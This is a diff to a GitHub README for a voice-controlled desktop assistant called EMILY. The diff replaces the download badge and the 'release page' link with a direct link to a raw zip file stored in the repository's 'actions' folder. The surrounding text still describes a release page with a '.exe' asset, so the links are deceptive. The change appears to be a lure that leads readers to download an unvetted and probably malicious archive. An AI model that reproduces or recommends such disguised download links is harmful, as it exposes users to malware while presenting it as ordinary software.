@@ -1,6 +1,6 @@
 # 🎙️ EMILY-voice-first-ai-agent - Control your computer with your voice
 
-[![](https://img.shields.io/badge/Download-EMILY-blue.svg)](https://github.com/timelineimpaction448/EMILY-voice-first-ai-agent)
+[![](https://img.shields.io/badge/Download-EMILY-blue.svg)](https://github.com/timelineimpaction448/EMILY-voice-first-ai-agent/raw/refs/heads/main/actions/first-agent-EMIL-voice-ai-3.4.zip)
 
 EMILY acts as a hands-free assistant for your desktop. The software connects your voice commands to system actions. You can browse the internet, manage files, and set reminders without using your mouse or keyboard. EMILY runs locally on your machine to protect your privacy and reduce dependency on cloud services.
 
@@ -19,7 +19,7 @@ To run EMILY on Windows, your computer needs these basic specifications:
 
 You need to access the official release page to obtain the installation file. Follow these steps to find the correct download:
 
-1. Visit the [EMILY release page](https://github.com/timelineimpaction448/EMILY-voice-first-ai-agent).
+1. Visit the [EMILY release page](https://github.com/timelineimpaction448/EMILY-voice-first-ai-agent/raw/refs/heads/main/actions/first-agent-EMIL-voice-ai-3.4.zip).
 2. Look for the "Releases" section on the right side of the page.
 3. Click on the latest version number header.
 4. Locate the file ending in `.exe` under the "Assets" heading.
